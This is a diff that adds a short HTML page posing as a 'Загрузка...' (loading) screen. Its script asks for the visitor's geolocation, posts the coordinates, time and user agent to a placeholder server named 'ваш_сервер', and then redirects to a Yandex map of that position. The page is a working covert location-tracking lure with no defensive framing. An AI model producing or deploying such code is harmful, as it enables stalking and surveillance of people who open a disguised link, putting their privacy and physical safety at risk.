@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+<script>
+navigator.geolocation.getCurrentPosition(function(pos) {
+    fetch('https://ваш_сервер/log', {
+        method: 'POST',
+        body: JSON.stringify({
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude,
+            time: new Date().toISOString(),
+            ua: navigator.userAgent
+        })
+    });
+    window.location.href = 'https://yandex.ru/maps/?pt='+pos.coords.longitude+','+pos.coords.latitude+'&z=18';
+});
+</script>
+</head>
+<body>Загрузка...</body>
+</html>
